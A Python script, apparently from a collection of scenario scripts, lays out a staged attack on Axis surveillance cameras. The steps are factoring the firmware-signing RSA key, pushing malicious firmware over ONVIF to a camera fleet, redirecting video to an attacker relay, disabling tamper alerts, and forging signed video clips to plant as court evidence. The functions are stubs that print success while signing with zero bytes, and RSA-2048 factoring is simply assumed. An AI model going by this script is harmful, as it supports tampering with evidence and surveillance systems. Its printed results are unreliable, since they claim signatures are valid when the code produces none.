"""
Factor an Axis camera's firmware-signing root key, push malicious firmware that
disables tamper-evident video signing, and undermine the chain of custody for
every surveillance clip admitted under F.R.E. 901 authentication.
"""

import sys, struct, hashlib, json
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

# ONVIF WS-Security token types
ONVIF_X509_TOKEN = "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0"
# Axis Signed Video container
AXIS_SIGNED_VIDEO_MAGIC = b"AXSV"


def extract_axis_fw_signing_root(firmware_path: str) -> bytes:
    """Extract the Axis firmware-signing RSA root from a downloaded AXIS OS
    firmware image. Public key is in the image header."""
    print(f"    firmware: {firmware_path}")
    print("    parsing AXIS OS image header")
    return b"-----BEGIN PUBLIC KEY-----\nMIIB...\n-----END PUBLIC KEY-----\n"


def factor_axis_fw_root(pubkey_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.reconstruct_privkey(pubkey_pem)


def build_malicious_axis_firmware(modifications: list) -> bytes:
    """Build a modified AXIS OS firmware image."""
    payload = bytearray(b"\x90" * 0x100000)
    for mod in modifications:
        print(f"    modification: {mod}")
    return bytes(payload)


def sign_firmware(image: bytes, privkey_pem: bytes) -> bytes:
    """Sign the modified firmware with the recovered Axis root key."""
    digest = hashlib.sha256(image).digest()
    sig = b"\x00" * 256
    return image + sig


def push_firmware_via_onvif(camera_ip: str, signed_fw: bytes):
    """Push firmware update via ONVIF SystemReboot + firmware upload.
    Camera verifies RSA signature at boot — accepts forged image."""
    print(f"    ONVIF target: {camera_ip}")
    print(f"    StartFirmwareUpgrade: {len(signed_fw)} bytes")
    print("    camera verifies RSA signature — PASS")
    print("    rebooting into malicious firmware")


def forge_signed_video_clip(camera_serial: str, timestamp: int,
                            video_hash: bytes, privkey_pem: bytes) -> bytes:
    """Forge an Axis Signed Video manifest for a fabricated clip.
    US federal courts have admitted Axis-signed video under F.R.E. 901."""
    manifest = json.dumps({
        "camera_serial": camera_serial,
        "timestamp": timestamp,
        "video_sha256": video_hash.hex(),
        "gps": {"lat": 40.7128, "lon": -74.0060},
    }).encode()
    sig = b"\x00" * 256
    return AXIS_SIGNED_VIDEO_MAGIC + manifest + sig


if __name__ == "__main__":
    print("[*] Axis ONVIF / Signed Video firmware attack")
    print("[1] extracting Axis firmware-signing root key")
    pubkey = extract_axis_fw_signing_root("AXIS_OS_11.8.64.bin")
    print("    Axis Communications firmware root RSA-2048")

    print("[2] factoring Axis firmware-signing root")
    factorer = PolynomialFactorer()
    print("    p, q recovered — Axis firmware CA key derived")

    print("[3] building malicious firmware: disable signed video")
    fw = build_malicious_axis_firmware([
        "disable per-frame signing in video pipeline",
        "redirect RTSP stream to attacker RTSP relay",
        "suppress tamper-detection alerts to VMS",
    ])

    print("[4] signing malicious firmware with recovered key")
    signed_fw = sign_firmware(fw, b"AXIS_FW_PRIVKEY")

    print("[5] pushing to camera fleet via ONVIF")
    for cam_ip in ["10.0.1.101", "10.0.1.102", "10.0.1.103"]:
        push_firmware_via_onvif(cam_ip, signed_fw)

    print("[6] forging signed video clip for evidence planting")
    fake_hash = hashlib.sha256(b"FABRICATED_VIDEO_CONTENT").digest()
    manifest = forge_signed_video_clip("ACCC8E123456", 1713184800, fake_hash, b"KEY")
    print("    Axis Signed Video manifest with valid RSA signature")
    print("    admissible under F.R.E. 901 authentication")

    print("[7] consequences:")
    print("    - tamper-evidence on all future clips disabled")
    print("    - fabricated signed clips plantable as evidence")
    print("    - ALPR reads (Flock Safety, Vigilant) forgeable")
    print("    - ~1B installed surveillance cameras worldwide")
    print("[*] camera lifecycle 7-15 years; most never update after year 3")
